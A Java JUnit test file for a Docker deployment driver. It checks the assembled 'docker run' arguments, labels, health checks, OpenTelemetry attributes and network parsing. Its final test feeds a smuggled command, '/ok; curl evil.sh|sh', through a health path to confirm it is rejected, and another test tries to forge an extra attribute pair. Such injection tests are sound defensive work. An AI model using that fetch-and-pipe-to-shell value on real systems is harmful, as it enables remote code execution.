package eu.wohlben.qits.platformdeployments.dockerhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.platformdeployments.deployments.control.DeploymentDriver;
import eu.wohlben.qits.platformdeployments.environments.entity.PdDeploymentTarget;
import eu.wohlben.qits.platformdeployments.environments.error.BadRequestException;
import io.smallrye.config.EnvConfigSource;
import io.smallrye.config.PropertiesConfigSource;
import io.smallrye.config.SmallRyeConfigBuilder;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker run} argv as assembled — plain JUnit over the package-private builder, the
 * {@code CiDaemonLauncherTest} stance: the argv IS the contract with the docker CLI, and asserting
 * it needs no docker.
 */
class DockerDeploymentDriverTest {

  private DockerDeploymentDriver driver() {
    return driver(Map.of());
  }

  private DockerDeploymentDriver driver(Map<String, String> properties) {
    DockerDeploymentDriver driver = new DockerDeploymentDriver();
    driver.runtime = "docker";
    driver.pullTimeoutSeconds = 600;
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 10;
    driver.outputMaxChars = 65536;
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(new PropertiesConfigSource(properties, "test", 100))
            .build();
    return driver;
  }

  private DeploymentDriver.StartSpec spec(String healthPath) {
    return new DeploymentDriver.StartSpec(
        "env-id",
        "dev",
        "app-id",
        "qits-gateway",
        "dep-id",
        "abc1234",
        "qits-env-dev-qits-gateway",
        "qits-artifacts:8080/qits/qits-gateway:abc1234",
        "qits-pd-dev-qits-gateway-dep",
        healthPath,
        PdDeploymentTarget.ENVIRONMENT,
        true);
  }

  /** A platform-plane container: no environment at all, and qits-platform as its primary network. */
  private DeploymentDriver.StartSpec platformSpec() {
    return new DeploymentDriver.StartSpec(
        null,
        null,
        "app-id",
        "qits-platform-deployments",
        "dep-id",
        "abc1234",
        "qits-platform",
        "qits-artifacts:8080/qits/qits-platform-deployments:abc1234",
        "qits-pd-platform-qits-platform-deployments-dep",
        "/cd/q/health/ready",
        PdDeploymentTarget.PLATFORM,
        false);
  }

  @Test
  void theArgvCarriesNetworkAliasLabelsHealthGateAndRestartPolicy() {
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertEquals(List.of("docker", "run", "-d"), argv.subList(0, 3));
    assertTrue(argv.containsAll(List.of("--network", "qits-env-dev-qits-gateway")));
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-gateway")));
    assertTrue(argv.containsAll(List.of("--restart", "unless-stopped")));
    assertTrue(argv.contains("qits.pd.environment=env-id"));
    assertTrue(argv.contains("qits.pd.application=app-id"));
    assertTrue(argv.contains("qits.pd.deployment=dep-id"));
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    assertTrue(argv.containsAll(List.of("--health-start-period", "10s")));
    assertTrue(argv.contains("QITS_ENVIRONMENT=dev"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
  }

  @Test
  void theArgvCarriesTheDeploymentsOtelResourceIdentity() {
    // The whole of workstream LD's first half: the container is told who it is, in OpenTelemetry's
    // own vocabulary, from values cd genuinely holds — the deployment's sha, the environment's
    // name, the container name cd just assigned. No invented version, no fake workspace ids.
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    String expected =
        "service.version=abc1234"
            + ",deployment.environment.name=dev"
            + ",service.instance.id=qits-pd-dev-qits-gateway-dep";
    assertTrue(argv.contains("OTEL_RESOURCE_ATTRIBUTES=" + expected));
    // The Quarkus-spelled twin carries the SAME string, and is what outranks the pom version
    // Quarkus bakes into the image as service.version at build time. Built once, so they cannot
    // drift apart.
    assertTrue(argv.contains("QUARKUS_OTEL_RESOURCE_ATTRIBUTES=" + expected));
  }

  @Test
  void theInjectedIdentityIsADefaultTheOperatorsRunArgsCanOverride() {
    // Precedence, and it is docker's rule rather than cd's: the LAST assignment of a repeated env
    // key is the one the container gets. cd's variables are written before run-args, so run-args
    // pass through untouched AND win — the injection composes with the operator instead of
    // fighting them.
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-gateway",
                "-v qits-data:/data -e OTEL_RESOURCE_ATTRIBUTES=service.version=operator"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    // The operator's arguments, verbatim and last before the image.
    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "-e",
            "OTEL_RESOURCE_ATTRIBUTES=service.version=operator",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 5, argv.size()));
    // cd's own copy is still there, and it is EARLIER — which is what makes it the loser.
    int injected = argv.indexOf("OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
        + ",deployment.environment.name=dev"
        + ",service.instance.id=qits-pd-dev-qits-gateway-dep");
    assertTrue(injected > 0, "cd still writes its own default");
    assertTrue(injected < argv.indexOf("OTEL_RESOURCE_ATTRIBUTES=service.version=operator"));
  }

  @Test
  void aResourceAttributeValueCannotForgeASecondPair() {
    // The belt at the argv, the health-path stance. Nothing validated at the boundary can carry a
    // comma today; this is what turns a loosened boundary check into a failed deployment rather
    // than a container stamped with attributes cd never wrote.
    DeploymentDriver.StartSpec forged =
        new DeploymentDriver.StartSpec(
            "env-id",
            "dev,service.name=impostor",
            "app-id",
            "qits-gateway",
            "dep-id",
            "abc1234",
            "qits-env-dev-qits-gateway",
            "qits-artifacts:8080/qits/qits-gateway:abc1234",
            "qits-pd-dev-qits-gateway-dep",
            "/q/health/ready",
            PdDeploymentTarget.ENVIRONMENT,
            false);

    assertThrows(BadRequestException.class, () -> driver().buildArgv(forged));
  }

  @Test
  void runArgsAreAppendedBetweenCdsOwnFlagsAndTheImage() {
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-gateway",
                "-v qits-data:/data --env FOO=bar"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "--env",
            "FOO=bar",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 5, argv.size()));
  }

  @Test
  void runArgsOfAnotherApplicationDoNotLeakIn() {
    // The absence is the assertion that matters: only the deployed application's own key reaches
    // its argv, so one application's socket mount cannot ride along on a sibling's deployment.
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-workspaces",
                "-v /var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
    assertTrue(argv.stream().noneMatch(a -> a.contains("docker.sock")));
  }

  @Test
  void runArgsResolveFromTheEnvSpelling() {
    // The deployment sets QITS_PD_RUN_ARGS_QITS_GATEWAY in compose; this pins that SmallRye's
    // env mapping really answers the dashed property name the driver asks for.
    DockerDeploymentDriver driver = driver();
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(
                new EnvConfigSource(Map.of("QITS_PD_RUN_ARGS_QITS_GATEWAY", "--env FOO=bar"), 300))
            .build();

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of("--env", "FOO=bar", "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 3, argv.size()));
  }

  @Test
  void aliasHolderParsingMatchesByNameOrAliasAndStripsTheLeadingSlash() {
    // docker inspect emits /name; a container's own name resolves on the network, so name==alias
    // counts (the compose-seeded case) as does an explicit --network-alias (cd's own case). The
    // fourth field is the environment label, and it decides whose predecessor the holder is.
    String output =
        "aaa111|/qits-gateway|qits-gateway abc|\n"
            + "bbb222|/qits-pd-dev-qits-gateway-12345678|qits-gateway|env-1\n"
            + "ccc333|/unrelated|other-alias|env-1\n";
    List<DeploymentDriver.Holder> holders =
        DockerDeploymentDriver.parseHolders(output, "qits-gateway");
    assertEquals(
        List.of(
            new DeploymentDriver.Holder("aaa111", "qits-gateway", null),
            new DeploymentDriver.Holder("bbb222", "qits-pd-dev-qits-gateway-12345678", "env-1")),
        holders);
  }

  @Test
  void dockerSayingTheContainerIsAlreadyOnTheNetworkIsNotAFailedJoin() {
    // The whole of what separates "the self-heal found nothing to do" from "this container is not
    // on a network it needs and no health gate will notice". The first wording is measured against
    // the platform's own daemon (29.5.3); the second is what older daemons answer.
    assertTrue(
        DockerDeploymentDriver.alreadyJoined(
            "Error response from daemon: endpoint with name qits-pd-dev-qits-gateway-1234abcd"
                + " already exists in network qits-net"));
    assertTrue(
        DockerDeploymentDriver.alreadyJoined(
            "Error response from daemon: container abc is already connected to network qits-net"));
    // Anything else is a real refusal — the match errs toward failing the deployment.
    assertFalse(
        DockerDeploymentDriver.alreadyJoined(
            "Error response from daemon: network qits-net not found"));
    assertFalse(DockerDeploymentDriver.alreadyJoined(""));
  }

  @Test
  void anUnlabelledHolderReportsNoEnvironmentWhateverDockerPrints() {
    // The container from before the labels existed is the one the migration adopts, so "no
    // environment" has to survive every spelling docker has for it: a missing field (an older
    // format), an empty one, and the `<no value>` a Go template prints for an absent map key —
    // measured on docker 29.5.3, where an `index` following the alias ranges produces exactly that.
    List<DeploymentDriver.Holder> holders =
        DockerDeploymentDriver.parseHolders(
            "aaa111|/qits-gateway|qits-gateway|<no value>\n"
                + "bbb222|/seeded|qits-gateway|\n"
                + "ccc333|/older-format|qits-gateway\n",
            "qits-gateway");

    assertEquals(
        List.of(
            new DeploymentDriver.Holder("aaa111", "qits-gateway", null),
            new DeploymentDriver.Holder("bbb222", "seeded", null),
            new DeploymentDriver.Holder("ccc333", "older-format", null)),
        holders);
  }

  @Test
  void theRefereeArgvSwapsTheEntrypointMountsTheSocketAndCarriesTheArbitrationScript() {
    DockerDeploymentDriver driver = driver();
    driver.dockerSocketPath = "/var/run/docker.sock";
    DeploymentDriver.HandoffSpec spec =
        new DeploymentDriver.HandoffSpec(
            "qits-artifacts:8080/qits/qits-platform-deployments:abc",
            "old-full-id",
            "qits-pd-qits-qits-platform-deployments-12345678",
            120);
    String script = "docker stop old-full-id\n...";

    List<String> argv = driver.buildHandoffArgv(spec, script);

    assertEquals(List.of("docker", "run", "-d", "--rm"), argv.subList(0, 4));
    assertTrue(argv.containsAll(List.of("--name", "qits-pd-handoff-12345678")));
    assertTrue(argv.containsAll(List.of("-v", "/var/run/docker.sock:/var/run/docker.sock")));
    assertTrue(argv.containsAll(List.of("--entrypoint", "/bin/sh")));
    // The image is the deployment's own — just pulled, guaranteed present — then -c <script>.
    int image = argv.indexOf("qits-artifacts:8080/qits/qits-platform-deployments:abc");
    assertEquals("-c", argv.get(image + 1));
    assertEquals(script, argv.get(image + 2));
  }

  @Test
  void theArgvLabelsThePlaneAndTheAliasAReconciliationWillNeed() {
    // These three labels are what a LATER deploy reads: when it makes a per-application network it
    // has to find this environment's public nodes and every platform container, and join them
    // under the right alias. Without qits.pd.app-name the join would land under the
    // deployment-suffixed container name, which no peer has ever been told.
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertTrue(argv.contains("qits.pd.target=environment"));
    assertTrue(argv.contains("qits.pd.available-on-env=true"));
    assertTrue(argv.contains("qits.pd.app-name=qits-gateway"));
  }

  @Test
  void aPlatformServiceCarriesNoEnvironmentLabelNoQitsEnvironmentAndIsPlatformToOtel() {
    // The absence of the environment label is the feature: an environment teardown reaps by it, and
    // a platform-plane container must never go down with a tier it merely serves. QITS_ENVIRONMENT
    // is absent for the same reason — a platform service is in no environment — and OTel is told
    // the one true thing instead.
    List<String> argv = driver().buildArgv(platformSpec());

    assertTrue(argv.stream().noneMatch(a -> a.startsWith("qits.pd.environment=")));
    assertTrue(argv.stream().noneMatch(a -> a.startsWith("QITS_ENVIRONMENT=")));
    assertTrue(argv.contains("qits.pd.target=platform"));
    assertTrue(argv.contains("qits.pd.available-on-env=false"));
    assertTrue(argv.containsAll(List.of("--network", "qits-platform")));
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-platform-deployments")));
    assertTrue(
        argv.contains(
            "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                + ",deployment.environment.name=platform"
                + ",service.instance.id=qits-pd-platform-qits-platform-deployments-dep"));
  }

  @Test
  void aCreatedNetworkCarriesTheLabelsEveryLaterLookupUsesToFindIt() {
    List<String> argv =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-env-dev-qits-gateway",
                    "env-id",
                    DeploymentDriver.NetworkKind.APPLICATION,
                    "qits-gateway"));

    assertEquals(List.of("docker", "network", "create"), argv.subList(0, 3));
    assertTrue(argv.contains("qits.pd.network=application"));
    assertTrue(argv.contains("qits.pd.environment=env-id"));
    assertTrue(argv.contains("qits.pd.app-name=qits-gateway"));
    assertEquals("qits-env-dev-qits-gateway", argv.get(argv.size() - 1));

    // The platform network belongs to no environment and to no application, and says so by leaving
    // both labels off rather than by writing an empty one.
    List<String> platform =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-platform", null, DeploymentDriver.NetworkKind.PLATFORM, null));
    assertTrue(platform.contains("qits.pd.network=platform"));
    assertTrue(platform.stream().noneMatch(a -> a.startsWith("qits.pd.environment=")));
    assertTrue(platform.stream().noneMatch(a -> a.startsWith("qits.pd.app-name=")));
  }

  @Test
  void networkListingReadsTheLabelsBackAndSkipsWhatIsNotCds() {
    String output =
        "qits-env-dev-qits-gateway|qits.pd.network=application,qits.pd.environment=env-1,"
            + "qits.pd.app-name=qits-gateway\n"
            + "qits-net|qits.pd.network=bundle,qits.pd.environment=env-1\n"
            + "qits-platform|qits.pd.network=platform\n"
            + "someone-elses|com.docker.compose.project=x\n";

    List<DeploymentDriver.Network> networks = DockerDeploymentDriver.parseNetworks(output);

    assertEquals(
        List.of(
            new DeploymentDriver.Network(
                "qits-env-dev-qits-gateway",
                "env-1",
                DeploymentDriver.NetworkKind.APPLICATION,
                "qits-gateway"),
            new DeploymentDriver.Network(
                "qits-net", "env-1", DeploymentDriver.NetworkKind.BUNDLE, null),
            new DeploymentDriver.Network(
                "qits-platform", null, DeploymentDriver.NetworkKind.PLATFORM, null)),
        networks);
  }

  @Test
  void aReconciliationCandidateWithoutAnAppNameLabelIsSkipped() {
    // A container from before this label existed cannot be joined under the right alias, so it is
    // left alone rather than joined under a name nothing resolves. Its own next deploy fixes it.
    List<DeploymentDriver.Endpoint> endpoints =
        DockerDeploymentDriver.parseEndpoints("aaa111|qits-gateway\nbbb222|\nccc333|qits-idp\n");

    assertEquals(
        List.of(
            new DeploymentDriver.Endpoint("aaa111", "qits-gateway"),
            new DeploymentDriver.Endpoint("ccc333", "qits-idp")),
        endpoints);
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // Belt on top of the boundary's braces: the one value interpolated into a string a shell will
    // run is re-validated at the last line before the argv.
    assertThrows(
        BadRequestException.class, () -> driver().buildArgv(spec("/ok; curl evil.sh|sh")));
  }
}
